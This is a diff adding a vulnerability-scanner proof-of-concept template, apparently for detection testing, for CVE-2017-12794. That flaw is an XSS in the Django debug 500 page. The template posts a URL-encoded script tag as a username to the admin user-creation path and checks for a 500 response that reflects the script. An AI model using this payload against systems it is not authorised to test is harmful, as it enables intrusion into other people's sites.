@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "Django 1.10.8之前及1.11.5之前版本的技术500调试页面存在XSS漏洞。当DEBUG=True时，攻击者通过创建含恶意脚本的用户名触发数据库唯一约束异常，未转义的异常信息在500页面中执行，导致XSS攻击。"
+id = "POC-AVE-2017-0037"
+name = "Django Debug Page XSS PoC"
+severity = "medium"
+tags = [
+    "cve-2017-12794",
+    "xss",
+    "django",
+]
+vuln_id = [
+    "CVE-2017-12794",
+    "AVE-2017-0037",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/auth/user/add/"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&password=test123&password2=test123"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(document.domain)</script>"]
